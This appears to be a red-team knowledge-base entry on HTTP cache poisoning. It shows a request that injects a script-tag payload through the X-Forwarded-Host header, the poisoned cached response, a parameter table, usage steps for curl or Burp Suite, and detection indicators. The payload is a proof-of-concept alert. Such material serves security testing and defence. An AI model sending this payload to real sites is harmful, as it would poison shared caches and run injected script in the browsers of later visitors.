---
id: 65361202-4629-4ed8-ac00-3b6739acce4c
name: http-cache-poisoning-x-forwarded-host-example
type: code
language: http
verified: true
created_at: '2023-04-06T03:56:41.273200+00:00'
updated_at: '2023-04-06T03:56:41.280739+00:00'
platforms:
  - Web
tags:
  - cache-poisoning
  - web
validated: true
---

# http-cache-poisoning-x-forwarded-host-example

## Code

```http
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
[..]
<meta property="og:image" content="https://test"><script>alert(1)</script>">
```

## Description

This HTTP request example demonstrates a cache poisoning attack using the X-Forwarded-Host header to inject a malicious script tag. The request targets a cacheable resource with a buster parameter, and the response shows how the payload is reflected and cached for subsequent victims.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| buster | Unique cache-busting parameter | 123 |
| Host | Target domain | target.com |
| X-Forwarded-Host | Injection payload | test"><script>alert(1)</script> |

## Usage

Use this as a template in tools like curl or Burp Suite to send the request. Replace placeholders with actual values. Verify by sending a clean request afterward to confirm the poisoned content is served from cache. Applicable in red team engagements targeting vulnerable web apps or CDNs.

## Detection

- WAF logs showing anomalous X-Forwarded-Host values with script tags.
- Increased cache hit rates on resources with unusual response content.
- JavaScript errors or alerts in client-side monitoring.
- Header analysis in proxy logs for injection patterns.

## Related

- [[procedures/Web-Cache-Deception-Unkeyed-Input-Cache-Poisoning]]
